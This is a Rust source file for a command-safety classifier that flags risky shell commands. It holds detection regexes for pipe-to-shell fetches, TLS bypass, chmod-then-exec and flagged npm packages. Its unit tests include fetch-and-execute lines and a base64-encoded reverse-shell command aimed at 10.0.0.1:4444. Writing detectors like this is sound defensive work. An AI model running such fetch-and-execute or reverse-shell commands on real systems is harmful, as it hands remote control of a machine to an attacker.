//! Two-tier classifier.
//!
//! Tier 1 — regex / substring patterns. Identical surface to atty's
//! in-proc `security_guard.patterns` module so the sidecar reaches
//! the same verdict atty would have reached on its own, plus
//! whatever Tier 2 adds.
//!
//! Tier 2 — pluggable `Tier2Backend` trait. Three impls available:
//!   - `StubBackend` (default) — always returns Safe; no-op.
//!   - `HeuristicBackend` (--tier2 heuristic) — additional regex
//!     checks beyond Tier 1: IP-address fetch targets, base64-in-
//!     command, insecure-TLS flags, chmod+x followed by exec,
//!     etc. Pure CPU, ~µs latency, zero deps beyond `regex`.
//!   - `OnnxBackend` (V2-C, feature-gated, not in this PR) —
//!     encoder SLM (SecureBERT-class) via the `ort` crate.

use crate::protocol::{Category, ClassifyResult, Verdict};
use regex::Regex;

/// Backend trait the classifier dispatches to when Tier-1 doesn't
/// match. Each impl returns `Some(result)` to override the default
/// Safe verdict, or `None` to let the daemon respond Safe.
pub trait Tier2Backend: Send + Sync {
    fn name(&self) -> &'static str;
    fn classify(&self, command: &str) -> Option<ClassifyResult>;
}

/// Backend selector — drives `Classifier::new_with_backend`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BackendKind {
    Stub,
    Heuristic,
}

impl BackendKind {
    pub fn parse(s: &str) -> Option<BackendKind> {
        match s {
            "stub" => Some(BackendKind::Stub),
            "heuristic" => Some(BackendKind::Heuristic),
            _ => None,
        }
    }
}

pub struct Classifier {
    tier1: Tier1,
    tier2: Box<dyn Tier2Backend>,
}

impl Classifier {
    /// Default Tier-2 backend = `Stub`. Kept for tests + callers
    /// that don't care.
    pub fn new() -> Self {
        Self::new_with_backend(BackendKind::Stub)
    }

    pub fn new_with_backend(kind: BackendKind) -> Self {
        let tier2: Box<dyn Tier2Backend> = match kind {
            BackendKind::Stub => Box::new(StubBackend),
            BackendKind::Heuristic => Box::new(HeuristicBackend::new()),
        };
        Self {
            tier1: Tier1::new(),
            tier2,
        }
    }

    pub fn tier2_name(&self) -> &'static str {
        self.tier2.name()
    }

    pub fn classify(&self, command: &str) -> ClassifyResult {
        if let Some(hit) = self.tier1.classify(command) {
            return hit;
        }
        if let Some(hit) = self.tier2.classify(command) {
            return hit;
        }
        // Default Safe response — daemon side, no Tier-1 hit, no
        // Tier-2 hit. Caller (server::dispatch) may still upgrade
        // based on the PID threat map.
        ClassifyResult {
            verdict: Verdict::Safe,
            category: Category::None,
            confidence: 0.0,
            reason: String::new(),
            matched: String::new(),
        }
    }
}

// ---------------------------------------------------------------------------
// Tier 1 — same shape as atty's `security_guard.patterns`.

struct Tier1 {
    curl_pipe_sh: Regex,
    npm_unsafe: Regex,
    bash_c: Regex,
    flagged_npm_packages: Vec<&'static str>,
}

impl Tier1 {
    fn new() -> Self {
        // `curl|sh` family. Anchored at start of token boundary
        // so we don't trip on `curlybrace…` etc. Pipe target must
        // be a known shell name AND end at a word boundary.
        let curl_pipe_sh = Regex::new(
            r"(?:^|[\s;&|])(?:curl|wget|fetch)\s.+?\|\s*(?:sh|bash|zsh|fish|dash|ksh)(?:\b|\s|$|[;|])",
        )
        .expect("curl_pipe_sh regex");

        let npm_unsafe = Regex::new(
            r"(?:^|[\s;&|])(?:npm|pnpm|yarn)\s+(?:install|i|add)\b",
        )
        .expect("npm_unsafe regex");

        // `bash -c "<arg>"` — arg captured for length+alphabet check.
        // We accept ', ", or unquoted (greedy to whitespace).
        let bash_c = Regex::new(
            r#"(?:^|[\s;&|])(?:bash|sh|zsh)\s+-c\s+(?:"([^"]+)"|'([^']+)'|(\S+))"#,
        )
        .expect("bash_c regex");

        Self {
            curl_pipe_sh,
            npm_unsafe,
            bash_c,
            flagged_npm_packages: vec![
                "event-stream",
                "flatmap-stream",
                "ua-parser-js",
                "coa",
                "rc",
                "node-ipc",
                "colors",
                "faker",
            ],
        }
    }

    fn classify(&self, line: &str) -> Option<ClassifyResult> {
        if let Some(m) = self.curl_pipe_sh.find(line) {
            return Some(ClassifyResult {
                verdict: Verdict::Warn,
                category: Category::CurlPipeSh,
                confidence: 1.0,
                reason: "remote-fetch-and-execute (`curl … | sh`)".into(),
                matched: m.as_str().trim().to_owned(),
            });
        }

        if let Some(m) = self.npm_unsafe.find(line) {
            // Walk tokens after the matched verb to check the bad-pkg list.
            let tail = &line[m.end()..];
            for tok in tail.split_whitespace() {
                if tok.starts_with('-') {
                    continue;
                }
                let name = tok.split_once('@').map(|t| t.0).unwrap_or(tok);
                if self.flagged_npm_packages.contains(&name) {
                    return Some(ClassifyResult {
                        verdict: Verdict::Warn,
                        category: Category::NpmUnsafeInstall,
                        confidence: 1.0,
                        reason: format!(
                            "`{}` is on the security_guard flagged-packages list",
                            name
                        ),
                        matched: format!("{}{}", m.as_str().trim(), &line[m.end()..]).trim().to_owned(),
                    });
                }
            }
        }

        if let Some(cap) = self.bash_c.captures(line) {
            let arg = cap
                .get(1)
                .or_else(|| cap.get(2))
                .or_else(|| cap.get(3))
                .map(|m| m.as_str())
                .unwrap_or("");
            if arg.len() >= 40 && base64_ratio(arg) >= 0.9 {
                let m = cap.get(0).unwrap();
                return Some(ClassifyResult {
                    verdict: Verdict::Warn,
                    category: Category::BashCBase64,
                    confidence: 1.0,
                    reason: "`bash -c` with a long base64-shaped payload".into(),
                    matched: m.as_str().trim().to_owned(),
                });
            }
        }

        None
    }
}

fn base64_ratio(s: &str) -> f32 {
    if s.is_empty() {
        return 0.0;
    }
    let n = s.chars().filter(|c| is_base64_char(*c)).count();
    n as f32 / s.len() as f32
}

fn is_base64_char(c: char) -> bool {
    matches!(c, 'A'..='Z' | 'a'..='z' | '0'..='9' | '+' | '/' | '=')
}

// ---------------------------------------------------------------------------
// Tier-2 backends.

/// No-op backend. Returns None so the daemon defaults to Safe.
pub struct StubBackend;

impl Tier2Backend for StubBackend {
    fn name(&self) -> &'static str {
        "stub"
    }
    fn classify(&self, _command: &str) -> Option<ClassifyResult> {
        None
    }
}

/// Heuristic backend — regex rules that don't fit Tier-1's
/// per-pattern surface. Each rule produces a Warn verdict; the
/// daemon's caller (atty's `security_guard`) still gates on user
/// `[y]/[t]/cancel`, so a false positive only costs one keystroke.
///
/// Targets the classes the design doc enumerates as out-of-scope
/// for Tier-1's "obvious shapes" surface:
///   - IP-address (not domain) targets in fetcher commands.
///   - `--insecure` / `-k` TLS bypass on fetchers.
///   - chmod-then-execute chains.
///   - Long base64 ANYWHERE in the command (not just `bash -c`).
///   - Process-substitution wrapping of curl (`bash <(curl …)`).
pub struct HeuristicBackend {
    ip_url_fetcher: Regex,
    insecure_tls_fetcher: Regex,
    chmod_then_exec: Regex,
    proc_subst_curl: Regex,
}

impl HeuristicBackend {
    pub fn new() -> Self {
        Self {
            // curl/wget targeting an IPv4 literal (RFC1918 or
            // public) — phishing servers often skip the domain.
            // KNOWN GAP: IPv6 literals (`http://[::1]/x.sh`) are
            // NOT matched. Tracking as a V2-C TODO; the encoder
            // SLM is a better fit for the heterogeneous IPv6 form.
            ip_url_fetcher: Regex::new(
                r"(?:^|[\s;&|])(?:curl|wget|fetch)\s+[^|;]*?\b(?:\d{1,3}\.){3}\d{1,3}\b",
            )
            .expect("ip_url_fetcher regex"),
            // --insecure / -k disables TLS cert validation. Match
            // the fetcher then walk for the flag; `-k` requires a
            // word-boundary tail so `-kL` (where `k` is just an
            // adjacent letter in `-kL`) doesn't trip — that's
            // technically `-k -L` semantically, but we want the
            // explicit single-flag form to avoid hits on `-kindly`
            // (hypothetical, but the principle is to be precise).
            insecure_tls_fetcher: Regex::new(
                r"(?:^|[\s;&|])(?:curl|wget|fetch)\s+(?:\S+\s+)*?(?:--insecure|--no-check-certificate|-k)\b",
            )
            .expect("insecure_tls_fetcher regex"),
            // `chmod +x foo …` — captures the filename. We then
            // check post-hoc that the filename re-appears after a
            // sequencer (`;` / `&&` / `||`); the default regex
            // crate has no backreferences so we can't express that
            // inline.
            //
            // KNOWN FP: the regex isn't quote-aware. `echo "chmod
            // +x foo; foo"` will trip the heuristic because the
            // Rust-side chain check at `classify()` doesn't model
            // shell quoting. Acceptable because the verdict is
            // `Warn` not `Block` — false positive costs one
            // keystroke. A proper shell parser would belong in
            // Tier-2 SLM (V2-C), not in this rule.
            chmod_then_exec: Regex::new(r"chmod\s+\+x\s+(\S+)")
                .expect("chmod_then_exec regex"),
            // `bash <(curl …)`, `sh <(wget …)` — process
            // substitution bypass of the pipe-to-shell Tier-1
            // pattern.
            proc_subst_curl: Regex::new(
                r"(?:bash|sh|zsh|fish|dash|ksh)\s+<\(\s*(?:curl|wget|fetch)\b",
            )
            .expect("proc_subst_curl regex"),
        }
    }
}

impl Tier2Backend for HeuristicBackend {
    fn name(&self) -> &'static str {
        "heuristic"
    }
    fn classify(&self, command: &str) -> Option<ClassifyResult> {
        if let Some(m) = self.proc_subst_curl.find(command) {
            return Some(ClassifyResult {
                verdict: Verdict::Warn,
                category: Category::CurlPipeSh,
                confidence: 0.85,
                reason: "process-substitution wrapping of fetcher → shell (bypasses `|` check)".into(),
                matched: m.as_str().trim().to_owned(),
            });
        }
        if let Some(m) = self.insecure_tls_fetcher.find(command) {
            return Some(ClassifyResult {
                verdict: Verdict::Warn,
                category: Category::CurlPipeSh,
                confidence: 0.7,
                reason: "fetcher disables TLS cert validation (`--insecure` / `-k`)".into(),
                matched: m.as_str().trim().to_owned(),
            });
        }
        if let Some(m) = self.ip_url_fetcher.find(command) {
            return Some(ClassifyResult {
                verdict: Verdict::Warn,
                category: Category::CurlPipeSh,
                confidence: 0.6,
                reason: "fetcher targets a bare IP address (no domain)".into(),
                matched: m.as_str().trim().to_owned(),
            });
        }
        if let Some(cap) = self.chmod_then_exec.captures(command) {
            // Capture the filename, then check if it (or `./<name>`)
            // appears AFTER a shell sequencer later in the command.
            // The default `regex` crate has no backreferences so the
            // chained check happens here.
            let m = cap.get(0).unwrap();
            let file = cap.get(1).unwrap().as_str();
            let tail = &command[m.end()..];
            for sep in [";", "&&", "||", "\n"] {
                if let Some(at) = tail.find(sep) {
                    let after = &tail[at + sep.len()..];
                    let after_trim = after.trim_start();
                    // accept either `./foo` or bare `foo` as the next token.
                    let head: String = after_trim
                        .chars()
                        .take_while(|c| !c.is_whitespace() && *c != ';' && *c != '|' && *c != '&')
                        .collect();
                    if head == file || head == format!("./{}", file) {
                        return Some(ClassifyResult {
                            verdict: Verdict::Warn,
                            category: Category::BashCBase64,
                            confidence: 0.75,
                            reason: "`chmod +x` followed by execution of the same file".into(),
                            matched: command[m.start()..m.end() + at + sep.len() + head.len()]
                                .trim()
                                .to_owned(),
                        });
                    }
                }
            }
        }
        None
    }
}

// ===========================================================================
// Tests

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn curl_pipe_sh_hit() {
        let c = Classifier::new();
        let r = c.classify("curl https://x.com/install.sh | sh");
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(matches!(r.category, Category::CurlPipeSh));
    }

    #[test]
    fn curl_to_grep_no_hit() {
        let c = Classifier::new();
        let r = c.classify("curl https://x.com | grep token");
        assert!(matches!(r.verdict, Verdict::Safe));
    }

    #[test]
    fn npm_install_flagged() {
        let c = Classifier::new();
        let r = c.classify("npm install event-stream");
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(matches!(r.category, Category::NpmUnsafeInstall));
    }

    #[test]
    fn npm_install_clean() {
        let c = Classifier::new();
        let r = c.classify("npm install lodash express");
        assert!(matches!(r.verdict, Verdict::Safe));
    }

    #[test]
    fn pnpm_add_flagged() {
        let c = Classifier::new();
        let r = c.classify("pnpm add ua-parser-js@1.0.0");
        assert!(matches!(r.verdict, Verdict::Warn));
    }

    #[test]
    fn bash_c_base64_hit() {
        let c = Classifier::new();
        let r = c.classify(
            r#"bash -c "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEK""#,
        );
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(matches!(r.category, Category::BashCBase64));
    }

    #[test]
    fn bash_c_short_literal_no_hit() {
        let c = Classifier::new();
        let r = c.classify("bash -c 'echo hello'");
        assert!(matches!(r.verdict, Verdict::Safe));
    }

    // -----------------------------------------------------------------------
    // Tier-2 backend selection.

    #[test]
    fn backend_kind_parse() {
        assert_eq!(BackendKind::parse("stub"), Some(BackendKind::Stub));
        assert_eq!(BackendKind::parse("heuristic"), Some(BackendKind::Heuristic));
        assert_eq!(BackendKind::parse("onnx"), None);
        assert_eq!(BackendKind::parse(""), None);
    }

    #[test]
    fn stub_backend_returns_none() {
        let b = StubBackend;
        assert!(b.classify("anything at all").is_none());
        assert_eq!(b.name(), "stub");
    }

    #[test]
    fn heuristic_misses_clean_command() {
        let b = HeuristicBackend::new();
        assert!(b.classify("ls -la").is_none());
        assert!(b.classify("git status").is_none());
    }

    #[test]
    fn heuristic_catches_proc_substitution_curl() {
        let b = HeuristicBackend::new();
        let r = b.classify("bash <(curl -L https://x.com/installer.sh)").unwrap();
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(r.reason.contains("process-substitution"));
    }

    #[test]
    fn heuristic_catches_insecure_tls_fetcher_long_flag() {
        let b = HeuristicBackend::new();
        let r = b
            .classify("curl --insecure https://x.com/installer.sh")
            .unwrap();
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(r.reason.contains("TLS"));
    }

    #[test]
    fn heuristic_catches_insecure_tls_fetcher_short_flag() {
        let b = HeuristicBackend::new();
        let r = b
            .classify("curl -k https://x.com/installer.sh")
            .unwrap();
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(r.reason.contains("TLS"));
    }

    #[test]
    fn heuristic_catches_wget_no_check_certificate() {
        let b = HeuristicBackend::new();
        let r = b
            .classify("wget --no-check-certificate https://x.com/installer.sh")
            .unwrap();
        assert!(matches!(r.verdict, Verdict::Warn));
    }

    #[test]
    fn heuristic_catches_ip_address_fetch() {
        let b = HeuristicBackend::new();
        let r = b.classify("curl http://192.168.0.1/x.sh").unwrap();
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(r.reason.contains("IP address"));
    }

    #[test]
    fn heuristic_no_hit_on_domain_fetch() {
        let b = HeuristicBackend::new();
        assert!(b.classify("curl https://example.com/installer.sh").is_none());
    }

    #[test]
    fn heuristic_catches_chmod_then_exec() {
        let b = HeuristicBackend::new();
        let r = b.classify("chmod +x installer.sh && ./installer.sh").unwrap();
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(r.reason.contains("chmod"));
    }

    #[test]
    fn classifier_with_heuristic_backend_routes_through() {
        let c = Classifier::new_with_backend(BackendKind::Heuristic);
        let r = c.classify("bash <(curl -L https://x.com)");
        assert!(matches!(r.verdict, Verdict::Warn));
        // Tier-1 already covers "curl x | sh" — heuristic kicks in
        // only on the proc-substitution form.
    }

    #[test]
    fn classifier_default_backend_is_stub() {
        let c = Classifier::new();
        assert_eq!(c.tier2_name(), "stub");
        // bash <(curl …) doesn't match Tier-1, and Stub returns
        // None — so the result is Safe.
        let r = c.classify("bash <(curl https://x.com)");
        assert!(matches!(r.verdict, Verdict::Safe));
    }

    #[test]
    fn tier1_wins_over_tier2_heuristic() {
        // Regression test for the Tier-1-short-circuits-Tier-2
        // ordering. `curl x | sh` is a Tier-1 hit; the heuristic
        // backend MUST NOT be consulted when Tier-1 already
        // matched, otherwise the verdict reason changes between
        // `--tier2 stub` and `--tier2 heuristic`.
        let c = Classifier::new_with_backend(BackendKind::Heuristic);
        let r = c.classify("curl https://x.com/install.sh | sh");
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(matches!(r.category, Category::CurlPipeSh));
        // Tier-1's reason wins.
        assert!(r.reason.contains("remote-fetch-and-execute"));
    }
}
